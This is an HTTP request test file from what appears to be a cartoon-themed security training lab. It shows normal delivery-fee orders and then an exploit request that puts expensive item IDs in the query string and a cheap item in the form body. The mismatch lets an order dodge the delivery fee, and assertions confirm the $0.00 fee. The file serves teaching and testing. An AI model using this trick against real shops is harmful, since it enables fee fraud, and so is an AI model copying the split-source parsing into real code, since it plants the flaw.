# @import ../common/setup.http
@base = {{base_host}}/v102

### Sandy introduces a new feature: free delivery for orders over $25.
# Plankton checks the menu items with their prices and thinks about bypassing the delivery fee.
# @name menu
GET {{base}}/menu

{{
  const menuData = menu;
  exports.cheap_item = menuData.find(i => i.price < 10);
  exports.expensive_item = menuData.find(i => i.price > 20);
}}

# --- Legitimate Usage: SpongeBob tests that delivery fee is working correctly ---

### Legitimate Usage
# SpongeBob adds a single item to his order.
# delivery fee for a cheap order is $5.00
POST {{base}}/orders
Authorization: {{spongebob_auth}}
Content-Type: application/x-www-form-urlencoded

items={{cheap_item.id}}

### Legitimate Usage
# SpongeBob adds multiple items, so the delivery fee is free.
POST {{base}}/orders
Authorization: {{spongebob_auth}}
Content-Type: application/x-www-form-urlencoded

items={{expensive_item.id}}&items={{expensive_item.id}}

# --- Exploit: Plankton tries to bypass the delivery fee ---

### Exploit: Plankton tricks the Delivery Fee Calculator
# He puts expensive items in the URL (Query String) to trigger the "Free Delivery > $25" rule.
# But he puts his actual cheap item in the Body (Form Data) to pay less.
# As a result, the delivery fee is $0.00!
# @name exploit
POST {{base}}/orders?items={{expensive_item.id}}&items={{expensive_item.id}}
Authorization: {{plankton_auth}}
Content-Type: application/x-www-form-urlencoded

items={{cheap_item.id}}

# Verification: Order created for the cheap item, but the Delivery Fee is $0.00!
?? status == 201
?? js response.parsedBody.delivery_fee == 0.00
?? js response.parsedBody.total == {{cheap_item.price}}
